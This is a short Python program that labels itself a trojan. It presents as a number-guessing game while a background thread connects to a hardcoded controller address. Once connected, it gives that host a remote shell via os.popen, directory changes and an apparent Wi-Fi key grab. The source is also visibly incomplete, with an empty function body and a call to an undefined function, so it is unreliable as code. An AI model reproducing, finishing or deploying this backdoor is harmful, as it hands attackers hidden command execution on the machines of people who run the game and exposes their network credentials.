#Trojan Imports
import socket
import os
import threading

#Game Imports
import random
import time


def trojan():
	try:
		DISCONNECT_MESSAGE = "!DISCONNECT"
		HOST = "192.168.0.12"
		PORT = 5050
		FORMAT = "utf-8"
		ADDR = (HOST, PORT)
		HEADER=64

		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		client.connect(ADDR)

		connected = True
		cmd_mode = False

		cd=False

		def send(msg):
			message = msg.encode(FORMAT)
			msg_length = len(message)
			send_length = str(msg_length).encode(FORMAT)
			send_length += b' ' *(HEADER - len(send_length))

			print(send_length)
			print(message)
			client.send(send_length)
			client.send(message)
		def get_wlan():
			

		while connected:
			msg_length = int(client.recv(HEADER).decode(FORMAT))
			print(msg_length)
			server_command = client.recv(msg_length).decode(FORMAT)
			print(server_command)

			if cd:
				os.chdir(server_command)
				send(os.getcwd())
				cd=False
	
			if server_command == "cmdon":
				send("You Have Terminal Access!")
				cmd_mode = True
				continue

			if server_command == "cmdoff":
				cmd_mode = False
				send("You Closed The Terminal!")

			if server_command == "cd":
					send("cd:")
					cd=True
					continue
			if server_command == "get wlan":
				send(wlan_key())

			if cmd_mode:
				cmd_line = os.popen(server_command)
				output = cmd_line.read()
				if output:
					send(output)	
				else:
					send(f"{server_command} was executed.")

	except ConnectionResetError:
		pass

def game():
	def mk_num():
		num = random.randint(1, 100)
		print("My Number Is Between 1 and 100\n")
		return num

	print("\nWelcome To The Number Guessing Game! Have A Go!\n")
	run=True

	while run:
		num = mk_num()

		guess=True
		attempts=0

		while guess:
			try:
				num_guess = input("Guess: ")

				if int(num_guess) == num:
					print(f"\nWell Done! You Guess Correctly. It Took You {attempts} Attemps!\n")
					time.sleep(1)
					guess=False
				else:
					attempts +=1
					print("Try Again!\n")
			except ValueError:
				print("You Need To Enter A Number")

trojan_thread = threading.Thread(target=trojan)
trojan_thread.start()

game_thread = threading.Thread(target=game)
game_thread.start()


